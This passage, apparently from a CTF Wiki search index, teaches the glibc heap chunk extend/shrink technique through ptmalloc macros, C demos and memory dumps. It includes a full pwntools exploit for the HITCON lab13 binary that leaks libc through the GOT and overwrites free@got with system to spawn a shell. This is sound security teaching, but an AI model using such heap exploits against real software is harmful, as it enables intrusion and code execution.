0xd8d379f22453ff00\n19:00c8\u2502 rbp  0x7ffe6a7f3f90 \u2014\u25b8 0x400cb0 \u25c2\u2014 push   r15\n1a:00d0\u2502      0x7ffe6a7f3f98 \u2014\u25b8 0x7f9db2113830 (__libc_start_main+240) \u25c2\u2014 mov    edi, eax\n\n\n\n\n\uff01\uff01\uff01\u5f85\u8865\u5145\uff01\uff01\uff01\n\n\n\u9898\u76ee\n\n\n\n\n2016 Nuit du Hack CTF Quals : night deamonic heap", 
            "title": "Chunk Extend / Shrink"
        }, 
        {
            "location": "/pwn/heap/chunk_extend_shrink/#chunk-extendshrink", 
            "text": "", 
            "title": "Chunk Extend/Shrink"
        }, 
        {
            "location": "/pwn/heap/chunk_extend_shrink/#_1", 
            "text": "chunk extend/shrink \u662f\u5806\u6f0f\u6d1e\u7684\u4e00\u79cd\u5e38\u89c1\u7684\u5229\u7528\u624b\u6cd5\uff0c\u4e0e\u5176\u4ed6\u5806\u6f0f\u6d1e\u7684\u5229\u7528\u76f8\u540c\uff0cchunk extend/shrink \u653b\u51fb\u540c\u6837\u9700\u8981\u6709\u53ef\u4ee5\u63a7\u5236 malloc_chunk \u7684\u6f0f\u6d1e\u3002\u8fd9\u79cd\u5229\u7528\u65b9\u6cd5\u9700\u8981\u4ee5\u4e0b\u7684\u5148\u51b3\u6761\u4ef6\uff1a   \u7a0b\u5e8f\u4e2d\u5b58\u5728\u57fa\u4e8e\u5806\u7684\u6f0f\u6d1e  \u6f0f\u6d1e\u53ef\u4ee5\u4f7f\u5f97 malloc_chunk \u80fd\u591f\u88ab\u653b\u51fb\u8005\u63a7\u5236", 
            "title": "\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/heap/chunk_extend_shrink/#_2", 
            "text": "\u8be5\u6280\u672f\u4f9d\u8d56\u4e8e ptmalloc(aka glibc) \u83b7\u53d6 malloc_chunk \u7684\u5404\u79cd\u5c5e\u6027\u7684\u5b8f\u3002  \u5728 ptmalloc \u4e2d\uff0c\u83b7\u53d6 chunk \u5757\u5927\u5c0f\u7684\u64cd\u4f5c\u5982\u4e0b  /* Get size, ignoring use bits */\n#define chunksize(p) (chunksize_nomask(p)   ~(SIZE_BITS))\n\n/* Like chunksize, but do not mask SIZE_BITS.  */\n#define chunksize_nomask(p) ((p)- mchunk_size) \n\u4e00\u79cd\u662f\u76f4\u63a5\u83b7\u53d6 chunk \u7684\u5927\u5c0f\uff0c\u4e0d\u5ffd\u7565\u63a9\u7801\u90e8\u5206\uff0c\u53e6\u5916\u4e00\u79cd\u662f\u5ffd\u7565\u63a9\u7801\u90e8\u5206\u3002  \u5728 ptmalloc \u4e2d\uff0c\u83b7\u53d6\u4e0b\u4e00 chunk \u5757\u5730\u5740\u7684\u64cd\u4f5c\u5982\u4e0b  /* Ptr to next physical malloc_chunk. */\n#define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p))) \n\u5373\u4f7f\u7528\u5f53\u524d\u5757\u6307\u9488\u52a0\u4e0a\u5f53\u524d\u5757\u5927\u5c0f\u3002  \u5728 ptmalloc \u4e2d\uff0c\u83b7\u53d6\u524d\u4e00\u4e2a chunk \u4fe1\u606f\u7684\u64cd\u4f5c\u5982\u4e0b  /* Size of the chunk below P.  Only valid if prev_inuse (P).  */\n#define prev_size(p) ((p)- mchunk_prev_size)\n\n/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */\n#define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p))) \n\u5373\u901a\u8fc7malloc_chunk- prev_size\u83b7\u53d6\u524d\u4e00\u5757\u5927\u5c0f\uff0c\u7136\u540e\u4f7f\u7528\u672c chunk \u5730\u5740\u51cf\u53bb\u6240\u5f97\u5927\u5c0f\u3002  \u5728 ptmalloc\uff0c\u5224\u65ad\u5f53\u524d chunk \u662f\u5426\u662fuse\u72b6\u6001\u7684\u64cd\u4f5c\u5982\u4e0b\uff1a #define inuse(p)\n    ((((mchunkptr)(((char *) (p)) + chunksize(p)))- mchunk_size)   PREV_INUSE) \n\u5373\u67e5\u770b\u4e0b\u4e00 chunk \u7684 prev_inuse \u57df\uff0c\u800c\u4e0b\u4e00\u5757\u5730\u5740\u53c8\u5982\u6211\u4eec\u524d\u9762\u6240\u8ff0\u662f\u6839\u636e\u5f53\u524d chunk \u7684 size \u8ba1\u7b97\u5f97\u51fa\u7684\u3002  \u66f4\u591a\u7684\u64cd\u4f5c\u8be6\u89c1  \u5806\u76f8\u5173\u6570\u636e\u7ed3\u6784  \u4e00\u8282\u3002\u7b80\u800c\u8a00\u4e4b\uff0cchunk extend/shrink \u5229\u7528\u5c31\u662f\u901a\u8fc7\u5bf9 size/pre_size \u57df\u8fdb\u884c\u63a7\u5236\u6765\u5b9e\u73b0\u7684\u201c\u653e\u7f29\u201d\u5229\u7528\u3002  \u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u5f88\u5c11\u89c1\u5230\u8fdb\u884c chunk shrink \u7684\u64cd\u4f5c\u3002\u6240\u4ee5\u8fd9\u91cc\u4e3b\u8981\u4ecb\u7ecd chunk extend \u7684\u5229\u7528\u3002", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/pwn/heap/chunk_extend_shrink/#1", 
            "text": "\u7b80\u5355\u6765\u8bf4\uff0c\u8be5\u5229\u7528\u7684\u6548\u679c\u662f\u901a\u8fc7\u66f4\u6539\u7b2c\u4e00\u4e2a\u5757\u7684\u5927\u5c0f\u6765\u63a7\u5236\u7b2c\u4e8c\u4e2a\u5757\u7684\u5185\u5bb9\u3002 \u6ce8\u610f\uff0c\u6211\u4eec\u7684\u793a\u4f8b\u90fd\u662f\u572864\u4f4d\u7684\u7a0b\u5e8f\u3002\u5982\u679c\u60f3\u572832\u4f4d\u4e0b\u8fdb\u884c\u6d4b\u8bd5\uff0c\u53ef\u4ee5\u628a8\u5b57\u8282\u504f\u79fb\u6539\u4e3a4\u5b57\u8282 \u3002 int main(void)\n{\n    void *ptr,*ptr1;\n\n    ptr=malloc(0x10);//\u5206\u914d\u7b2c\u4e00\u4e2a0x10\u7684chunk\n    malloc(0x10);//\u5206\u914d\u7b2c\u4e8c\u4e2a0x10\u7684chunk\n\n    *(long long *)((long long)ptr-0x8)=0x41;// \u4fee\u6539\u7b2c\u4e00\u4e2a\u5757\u7684size\u57df\n\n    free(ptr);\n    ptr1=malloc(0x30);// \u5b9e\u73b0 extend\uff0c\u63a7\u5236\u4e86\u7b2c\u4e8c\u4e2a\u5757\u7684\u5185\u5bb9\n    return 0;\n} \n\u5f53\u4e24\u4e2amalloc\u8bed\u53e5\u6267\u884c\u4e4b\u540e\uff0c\u5806\u7684\u5185\u5b58\u5206\u5e03\u5982\u4e0b 0x602000:   0x0000000000000000  0x0000000000000021  === chunk 1\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000000021  === chunk 2\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000020fc1  === top chunk \n\u4e4b\u540e\uff0c\u6211\u4eec\u628a chunk1 \u7684 size \u57df\u66f4\u6539\u4e3a 0x41\uff0c0x41 \u662f\u56e0\u4e3a chunk \u7684 size \u57df\u5305\u542b\u4e86\u7528\u6237\u63a7\u5236\u7684\u5927\u5c0f\u548c header \u7684\u5927\u5c0f\u3002\u5982\u4e0a\u6240\u793a\u6b63\u597d\u5927\u5c0f\u4e3a0x40\u3002\u5728\u9898\u76ee\u4e2d\u8fd9\u4e00\u6b65\u53ef\u4ee5\u7531\u5806\u6ea2\u51fa\u5f97\u5230\u3002 0x602000:   0x0000000000000000  0x0000000000000041  === \u7be1\u6539\u5927\u5c0f\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000000021\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000020fc1  \n\u6267\u884c free \u4e4b\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230 chunk2 \u4e0e chunk1 \u5408\u6210\u4e00\u4e2a 0x40 \u5927\u5c0f\u7684 chunk\uff0c\u4e00\u8d77\u91ca\u653e\u4e86\u3002 Fastbins[idx=0, size=0x10] 0x00\nFastbins[idx=1, size=0x20] 0x00\nFastbins[idx=2, size=0x30]  \u2190  Chunk(addr=0x602010, size=0x40, flags=PREV_INUSE) \nFastbins[idx=3, size=0x40] 0x00\nFastbins[idx=4, size=0x50] 0x00\nFastbins[idx=5, size=0x60] 0x00\nFastbins[idx=6, size=0x70] 0x00 \n\u4e4b\u540e\u6211\u4eec\u901a\u8fc7 malloc(0x30) \u5f97\u5230 chunk1+chunk2 \u7684\u5757\uff0c\u6b64\u65f6\u5c31\u53ef\u4ee5\u76f4\u63a5\u63a7\u5236chunk2\u4e2d\u7684\u5185\u5bb9\uff0c\u6211\u4eec\u4e5f\u628a\u8fd9\u79cd\u72b6\u6001\u79f0\u4e3a overlapping chunk\u3002 call   0x400450  malloc@plt \nmov    QWORD PTR [rbp-0x8], rax\n\nrax = 0x602010", 
            "title": "\u57fa\u672c\u793a\u4f8b1"
        }, 
        {
            "location": "/pwn/heap/chunk_extend_shrink/#2", 
            "text": "\u901a\u8fc7\u4e4b\u524d\u6df1\u5165\u7406\u89e3\u5806\u7684\u5b9e\u73b0\u90e8\u5206\u7684\u5185\u5bb9\uff0c\u6211\u4eec\u5f97\u77e5\u5904\u4e8e fastbin \u8303\u56f4\u7684 chunk \u91ca\u653e\u540e\u4f1a\u88ab\u7f6e\u5165 fastbin \u94fe\u8868\u4e2d\uff0c\u800c\u4e0d\u5904\u4e8e\u8fd9\u4e2a\u8303\u56f4\u7684 chunk \u88ab\u91ca\u653e\u540e\u4f1a\u88ab\u7f6e\u4e8eunsorted bin\u94fe\u8868\u4e2d\u3002\n\u4ee5\u4e0b\u8fd9\u4e2a\u793a\u4f8b\u4e2d\uff0c\u6211\u4eec\u4f7f\u7528 0x80 \u8fd9\u4e2a\u5927\u5c0f\u6765\u5206\u914d\u5806\uff08\u4f5c\u4e3a\u5bf9\u6bd4\uff0cfastbin \u9ed8\u8ba4\u7684\u6700\u5927\u7684 chunk \u53ef\u4f7f\u7528\u8303\u56f4\u662f0x70\uff09 int main()\n{\n    void *ptr,*ptr1;\n\n    ptr=malloc(0x80);//\u5206\u914d\u7b2c\u4e00\u4e2a 0x80 \u7684chunk1\n    malloc(0x10); //\u5206\u914d\u7b2c\u4e8c\u4e2a 0x10 \u7684chunk2\n    malloc(0x10); //\u9632\u6b62\u4e0etop chunk\u5408\u5e76\n\n    *(int *)((int)ptr-0x8)=0xb1;\n    free(ptr);\n    ptr1=malloc(0xa0);\n} \n\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u56e0\u4e3a\u5206\u914d\u7684 size \u4e0d\u5904\u4e8e fastbin \u7684\u8303\u56f4\uff0c\u56e0\u6b64\u5728\u91ca\u653e\u65f6\u5982\u679c\u4e0e top chunk \u76f8\u8fde\u4f1a\u5bfc\u81f4\u548ctop chunk\u5408\u5e76\u3002\u6240\u4ee5\u6211\u4eec\u9700\u8981\u989d\u5916\u5206\u914d\u4e00\u4e2achunk\uff0c\u628a\u91ca\u653e\u7684\u5757\u4e0etop chunk\u9694\u5f00\u3002 0x602000:   0x0000000000000000  0x00000000000000b1  ===chunk1 \u7be1\u6539size\u57df\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000000000\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000000\n0x602050:   0x0000000000000000  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000000000\n0x602070:   0x0000000000000000  0x0000000000000000\n0x602080:   0x0000000000000000  0x0000000000000000\n0x602090:   0x0000000000000000  0x0000000000000021  === chunk2\n0x6020a0:   0x0000000000000000  0x0000000000000000\n0x6020b0:   0x0000000000000000  0x0000000000000021  === \u9632\u6b62\u5408\u5e76\u7684chunk\n0x6020c0:   0x0000000000000000  0x0000000000000000\n0x6020d0:   0x0000000000000000  0x0000000000020f31  === top chunk \n\u91ca\u653e\u540e\uff0cchunk1 \u628a chunk2 \u7684\u5185\u5bb9\u541e\u5e76\u6389\u5e76\u4e00\u8d77\u7f6e\u5165unsorted bin 0x602000:   0x0000000000000000  0x00000000000000b1  === \u88ab\u653e\u5165unsorted bin\n0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78\n0x602020:   0x0000000000000000  0x0000000000000000\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000000\n0x602050:   0x0000000000000000  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000000000\n0x602070:   0x0000000000000000  0x0000000000000000\n0x602080:   0x0000000000000000  0x0000000000000000\n0x602090:   0x0000000000000000  0x0000000000000021\n0x6020a0:   0x0000000000000000  0x0000000000000000\n0x6020b0:   0x00000000000000b0  0x0000000000000020  === \u6ce8\u610f\u6b64\u5904\u6807\u8bb0\u4e3a\u7a7a\n0x6020c0:   0x0000000000000000  0x0000000000000000\n0x6020d0:   0x0000000000000000  0x0000000000020f31  === top chunk  [+] unsorted_bins[0]: fw=0x602000, bk=0x602000\n \u2192   Chunk(addr=0x602010, size=0xb0, flags=PREV_INUSE) \n\u518d\u6b21\u8fdb\u884c\u5206\u914d\u7684\u65f6\u5019\u5c31\u4f1a\u53d6\u56de chunk1 \u548c chunk2 \u7684\u7a7a\u95f4\uff0c\u6b64\u65f6\u6211\u4eec\u5c31\u53ef\u4ee5\u63a7\u5236 chunk2 \u4e2d\u7684\u5185\u5bb9      0x4005b0  main+74         call   0x400450  malloc@plt \n \u2192   0x4005b5  main+79         mov    QWORD PTR [rbp-0x8], rax\n\n     rax : 0x0000000000602010", 
            "title": "\u57fa\u672c\u793a\u4f8b2"
        }, 
        {
            "location": "/pwn/heap/chunk_extend_shrink/#3", 
            "text": "\u793a\u4f8b3\u662f\u5728\u793a\u4f8b2\u7684\u57fa\u7840\u4e0a\u8fdb\u884c\u7684\uff0c\u8fd9\u6b21\u6211\u4eec\u5148\u91ca\u653e chunk1\uff0c\u7136\u540e\u518d\u4fee\u6539\u5904\u4e8e unsorted bin \u4e2d\u7684 chunk1 \u7684size\u57df\u3002 int main()\n{\n    void *ptr,*ptr1;\n\n    ptr=malloc(0x80);//\u5206\u914d\u7b2c\u4e00\u4e2a0x80\u7684chunk1\n    malloc(0x10);//\u5206\u914d\u7b2c\u4e8c\u4e2a0x10\u7684chunk2\n\n    free(ptr);//\u9996\u5148\u8fdb\u884c\u91ca\u653e\uff0c\u4f7f\u5f97chunk1\u8fdb\u5165unsorted bin\n\n    *(int *)((int)ptr-0x8)=0xb1;\n    ptr1=malloc(0xa0);\n} \n\u4e24\u6b21 malloc \u4e4b\u540e\u7684\u7ed3\u679c\u5982\u4e0b 0x602000:   0x0000000000000000  0x0000000000000091  === chunk 1\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000000000\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000000\n0x602050:   0x0000000000000000  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000000000\n0x602070:   0x0000000000000000  0x0000000000000000\n0x602080:   0x0000000000000000  0x0000000000000000\n0x602090:   0x0000000000000000  0x0000000000000021  === chunk 2\n0x6020a0:   0x0000000000000000  0x0000000000000000\n0x6020b0:   0x0000000000000000  0x0000000000020f51 \n\u6211\u4eec\u9996\u5148\u91ca\u653echunk1\u4f7f\u5b83\u8fdb\u5165unsorted bin\u4e2d      unsorted_bins[0]: fw=0x602000, bk=0x602000\n \u2192   Chunk(addr=0x602010, size=0x90, flags=PREV_INUSE)\n\n0x602000:   0x0000000000000000  0x0000000000000091  === \u8fdb\u5165unsorted bin\n0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78\n0x602020:   0x0000000000000000  0x0000000000000000\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000000\n0x602050:   0x0000000000000000  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000000000\n0x602070:   0x0000000000000000  0x0000000000000000\n0x602080:   0x0000000000000000  0x0000000000000000\n0x602090:   0x0000000000000090  0x0000000000000020  === chunk 2\n0x6020a0:   0x0000000000000000  0x0000000000000000\n0x6020b0:   0x0000000000000000  0x0000000000020f51  === top chunk \n\u7136\u540e\u7be1\u6539chunk1\u7684size\u57df 0x602000:   0x0000000000000000  0x00000000000000b1  === size\u57df\u88ab\u7be1\u6539\n0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78\n0x602020:   0x0000000000000000  0x0000000000000000\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000000\n0x602050:   0x0000000000000000  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000000000\n0x602070:   0x0000000000000000  0x0000000000000000\n0x602080:   0x0000000000000000  0x0000000000000000\n0x602090:   0x0000000000000090  0x0000000000000020\n0x6020a0:   0x0000000000000000  0x0000000000000000\n0x6020b0:   0x0000000000000000  0x0000000000020f51 \n\u6b64\u65f6\u518d\u8fdb\u884c malloc \u5206\u914d\u5c31\u53ef\u4ee5\u5f97\u5230 chunk1+chunk2 \u7684\u5806\u5757\uff0c\u4ece\u800c\u63a7\u5236\u4e86chunk2 \u7684\u5185\u5bb9\u3002", 
            "title": "\u57fa\u672c\u793a\u4f8b3"
        }, 
        {
            "location": "/pwn/heap/chunk_extend_shrink/#chunk-extendshrink_1", 
            "text": "\u4e00\u822c\u6765\u8bf4\uff0c\u8fd9\u79cd\u6280\u672f\u5e76\u4e0d\u80fd\u76f4\u63a5\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u7a0b\uff0c\u4f46\u662f\u53ef\u4ee5\u5bfc\u81f4 chunk overlapping\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5b8c\u6574\u7684\u63a7\u5236\u8fd9\u4e2a\u5806\u5757 chunk \u4e2d\u7684\u5185\u5bb9\u3002\u5982\u679c chunk \u5b58\u5728\u5b57\u7b26\u4e32\u6307\u9488\u3001\u51fd\u6570\u6307\u9488\u7b49\uff0c\u5c31\u53ef\u4ee5\u5229\u7528\u8fd9\u4e9b\u6307\u9488\u6765\u8fdb\u884c\u4fe1\u606f\u6cc4\u6f0f\u548c\u63a7\u5236\u6267\u884c\u6d41\u7a0b\u3002\u5982\u679c\u4e0d\u5b58\u5728\u7c7b\u4f3c\u7684\u57df\u4e5f\u53ef\u4ee5\u901a\u8fc7\u63a7\u5236 chunk header \u4e2d\u7684\u6570\u636e\u6765\u5b9e\u73b0 fastbin attack \u7b49\u5229\u7528\u3002", 
            "title": "Chunk Extend/Shrink \u53ef\u4ee5\u505a\u4ec0\u4e48"
        }, 
        {
            "location": "/pwn/heap/chunk_extend_shrink/#hitcon-trainging-lab13", 
            "text": "", 
            "title": "HITCON Trainging lab13"
        }, 
        {
            "location": "/pwn/heap/chunk_extend_shrink/#_3", 
            "text": "\u279c  hitcontraning_lab13 git: ( master )  file heapcreator\nheapcreator: ELF  64 -bit LSB executable, x86-64, version  1   ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,  for  GNU/Linux  2 .6.32, BuildID [ sha1 ]= 5e69111eca74cba2fb372dfcd3a59f93ca58f858, not stripped\n\u279c  hitcontraning_lab13 git: ( master )  checksec heapcreator [ * ]   /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/chunk_extend_shrink/hitcontraning_lab13/heapcreator \n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE  ( 0x400000 )   \u7a0b\u5e8f\u4e3a 64 \u4f4d\u52a8\u6001\u94fe\u63a5\u7a0b\u5e8f\uff0c\u4e3b\u8981\u5f00\u542f\u4e86 Canary \u4fdd\u62a4\u4e0e NX \u4fdd\u62a4\u3002", 
            "title": "\u57fa\u672c\u4fe1\u606f"
        }, 
        {
            "location": "/pwn/heap/chunk_extend_shrink/#_4", 
            "text": "\u7a0b\u5e8f\u5927\u6982\u662f\u4e00\u4e2a\u81ea\u5b9a\u4e49\u7684\u5806\u5206\u914d\u5668\uff0c\u6bcf\u4e2a\u5806\u4e3b\u8981\u6709\u4e24\u4e2a\u6210\u5458\uff1a\u5927\u5c0f\u4e0e\u5185\u5bb9\u6307\u9488\u3002\u4e3b\u8981\u529f\u80fd\u5982\u4e0b   \u521b\u5efa\u5806\uff0c\u6839\u636e\u7528\u6237\u8f93\u5165\u7684\u957f\u5ea6\uff0c\u7533\u8bf7\u5bf9\u5e94\u5185\u5b58\u7a7a\u95f4\uff0c\u5e76\u5229\u7528 read \u8bfb\u53d6\u6307\u5b9a\u957f\u5ea6\u5185\u5bb9\u3002\u8fd9\u91cc\u957f\u5ea6\u6ca1\u6709\u8fdb\u884c\u68c0\u6d4b\uff0c\u5f53\u957f\u5ea6\u4e3a\u8d1f\u6570\u65f6\uff0c\u4f1a\u51fa\u73b0\u4efb\u610f\u957f\u5ea6\u5806\u6ea2\u51fa\u7684\u6f0f\u6d1e\u3002\u5f53\u7136\uff0c\u524d\u63d0\u662f\u53ef\u4ee5\u8fdb\u884c malloc\u3002\u6b64\u5916\uff0c\u8fd9\u91cc\u8bfb\u53d6\u4e4b\u540e\u5e76\u6ca1\u6709\u8bbe\u7f6e NULL\u3002  \u7f16\u8f91\u5806\uff0c\u6839\u636e\u6307\u5b9a\u7684\u7d22\u5f15\u4ee5\u53ca\u4e4b\u524d\u5b58\u50a8\u7684\u5806\u7684\u5927\u5c0f\u8bfb\u53d6\u6307\u5b9a\u5185\u5bb9\uff0c\u4f46\u662f\u8fd9\u91cc\u8bfb\u5165\u7684\u957f\u5ea6\u4f1a\u6bd4\u4e4b\u524d\u5927 1\uff0c\u6240\u4ee5\u4f1a \u5b58\u5728 off by one \u7684\u6f0f\u6d1e \u3002  \u5c55\u793a\u5806\uff0c\u8f93\u51fa\u6307\u5b9a\u7d22\u5f15\u5806\u7684\u5927\u5c0f\u4ee5\u53ca\u5185\u5bb9\u3002  \u5220\u9664\u5806\uff0c\u5220\u9664\u6307\u5b9a\u5806\uff0c\u5e76\u4e14\u5c06\u5bf9\u5e94\u6307\u9488\u8bbe\u7f6e\u4e3a\u4e86 NULL\u3002", 
            "title": "\u57fa\u672c\u529f\u80fd"
        }, 
        {
            "location": "/pwn/heap/chunk_extend_shrink/#_5", 
            "text": "\u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b   \u5229\u7528off by one \u6f0f\u6d1e\u8986\u76d6\u4e0b\u4e00\u4e2achunk \u7684 size \u5b57\u6bb5\uff0c\u4ece\u800c\u6784\u9020\u4f2a\u9020\u7684 chunk \u5927\u5c0f\u3002  \u7533\u8bf7\u4f2a\u9020\u7684 chunk \u5927\u5c0f\uff0c\u4ece\u800c\u4ea7\u751f chunk overlap\uff0c\u8fdb\u800c\u4fee\u6539\u5173\u952e\u6307\u9488\u3002   \u66f4\u52a0\u5177\u4f53\u7684\u8fd8\u662f\u76f4\u63a5\u770b\u811a\u672c\u5427\u3002  #!/usr/bin/env python  # -*- coding: utf-8 -*-  from   pwn   import   *  r   =   process ( ./heapcreator )  heap   =   ELF ( ./heapcreator )  libc   =   ELF ( ./libc.so.6 )  def   create ( size ,   content ): \n     r . recvuntil ( : ) \n     r . sendline ( 1 ) \n     r . recvuntil ( : ) \n     r . sendline ( str ( size )) \n     r . recvuntil ( : ) \n     r . sendline ( content )  def   edit ( idx ,   content ): \n     r . recvuntil ( : ) \n     r . sendline ( 2 ) \n     r . recvuntil ( : ) \n     r . sendline ( str ( idx )) \n     r . recvuntil ( : ) \n     r . sendline ( content )  def   show ( idx ): \n     r . recvuntil ( : ) \n     r . sendline ( 3 ) \n     r . recvuntil ( : ) \n     r . sendline ( str ( idx ))  def   delete ( idx ): \n     r . recvuntil ( : ) \n     r . sendline ( 4 ) \n     r . recvuntil ( : ) \n     r . sendline ( str ( idx ))  free_got   =   0x602018  create ( 0x18 ,   dada )    # 0  create ( 0x10 ,   ddaa )    # 1  # overwrite heap 1 s struct s size to 0x41  edit ( 0 ,   /bin/sh \\x00   +   a   *   0x10   +   \\x41 )  # trigger heap 1 s struct to fastbin 0x40  # heap 1 s content to fastbin 0x20  delete ( 1 )  # new heap 1 s struct will point to old heap 1 s content, size 0x20  # new heap 1 s content will point to old heap 1 s struct, size 0x30  # that is to say we can overwrite new heap 1 s struct  # here we overwrite its heap content pointer to free@got  create ( 0x30 ,   p64 ( 0 )   *   4   +   p64 ( 0x30 )   +   p64 ( heap . got [ free ]))    #1  # leak freeaddr  show ( 1 )  r . recvuntil ( Content :  )  data   =   r . recvuntil ( Done ! )  free_addr   =   u64 ( data . split ( \\n )[ 0 ] . ljust ( 8 ,   \\x00 ))  libc_base   =   free_addr   -   libc . symbols [ free ]  log . success ( libc base addr:    +   hex ( libc_base ))  system_addr   =   libc_base   +   libc . symbols [ system ]  #gdb.attach(r)  # overwrite free@got with system addr  edit ( 1 ,   p64 ( system_addr ))  # trigger system( /bin/sh )  delete ( 0 )  r . interactive ()", 
            "title": "\u5229\u7528"
        }, 
        {
            "location": "/pwn/heap/chunk_extend_shrink/#2015-hacklu-bookstore", 
            "text": "", 
            "title": "2015 hacklu bookstore"
        }, 
        {
            "location": "/pwn/heap/chunk_extend_shrink/#_6", 
            "text": "\u279c  2015_hacklu_bookstore git: ( master )  file books    \nbooks: ELF  64 -bit LSB executable, x86-64, version  1   ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,  for  GNU/Linux  2 .6.32, BuildID [ sha1 ]= 3a15f5a8e83e55c535d220473fa76c314d26b124, stripped\n\u279c  2015_hacklu_bookstore git: ( master )  checksec books     [ * ]   /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/chunk_extend_shrink/2015_hacklu_bookstore/books \n    Arch:     amd64-64-little\n    RELRO:    No RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE  ( 0x400000 )   \u53ef\u4ee5\u770b\u51fa\u8be5\u7a0b\u5e8f\u662f\u52a8\u6001\u94fe\u63a5\u7684 64 \u4f4d\u7a0b\u5e8f\uff0c\u4e3b\u8981\u5f00\u542f\u4e86 Canary \u4e0e NX \u4fdd\u62a4\u3002", 
            "title": "\u57fa\u672c\u4fe1\u606f"
        }, 
        {
            "location": "/pwn/heap/chunk_extend_shrink/#_7", 
            "text": "\u8be5\u7a0b\u5e8f\u7684\u4e3b\u8981\u529f\u80fd\u662f\u8ba2\u4e66\uff0c\u5177\u4f53\u5982\u4e0b   \u6700\u591a\u53ef\u4ee5\u8ba2\u8d2d\u4e24\u672c\u4e66\u3002  \u6839\u636e\u7f16\u53f7\u6765\u9009\u62e9\u8ba2\u8d2d\u7b2c\u51e0\u672c\u4e66\uff0c\u53ef\u4ee5\u4e3a\u6bcf\u672c\u4e66\u6dfb\u52a0\u5bf9\u5e94\u7684\u540d\u5b57\u3002\u7136\u800c\u5728\u6dfb\u52a0\u540d\u5b57\u5904\u51fa\u73b0\u4e86\u4efb\u610f\u957f\u5ea6\u5806\u6ea2\u51fa\u7684\u6f0f\u6d1e\u3002  \u6839\u636e\u7f16\u53f7\u6765\u5220\u9664 order\uff0c\u4f46\u662f\u8fd9\u91cc\u53ea\u662f\u5355\u7eaf\u5730 free \u6389\uff0c\u5e76\u6ca1\u6709\u7f6e\u4e3a NULL\uff0c\u56e0\u6b64\u4f1a\u51fa\u73b0 use after free \u7684\u6f0f\u6d1e\u3002  \u63d0\u4ea4\u8ba2\u5355\uff0c\u5c06\u4e24\u672c\u4e66\u7684\u540d\u5b57\u5408\u5728\u4e00\u8d77\u3002\u8fd9\u91cc\u7531\u4e8e\u4e0a\u9762\u5806\u6ea2\u51fa\u7684\u95ee\u9898\uff0c\u8fd9\u91cc\u4e5f\u4f1a\u51fa\u73b0\u5806\u6ea2\u51fa\u7684\u6f0f\u6d1e\u3002  \u6b64\u5916\uff0c\u5728\u7a0b\u5e8f\u9000\u51fa\u4e4b\u524d\u5b58\u5728\u4e00\u4e2a \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e \u3002   \u8fd9\u91cc\u867d\u7136\u7a0b\u5e8f\u7684\u6f0f\u6d1e\u80fd\u529b\u5f88\u5f3a\uff0c\u4f46\u662f\u6240\u6709\u8fdb\u884c malloc \u7684\u5927\u5c0f\u90fd\u662f\u5b8c\u5168\u56fa\u5b9a\u7684\uff0c\u6211\u4eec\u53ea\u80fd\u501f\u52a9\u8fd9\u4e9b\u5206\u914d\u7684 chunk \u6765\u8fdb\u884c\u64cd\u4f5c\u3002", 
            "title": "\u57fa\u672c\u529f\u80fd"
        }, 
        {
            "location": "/pwn/heap/chunk_extend_shrink/#_8", 
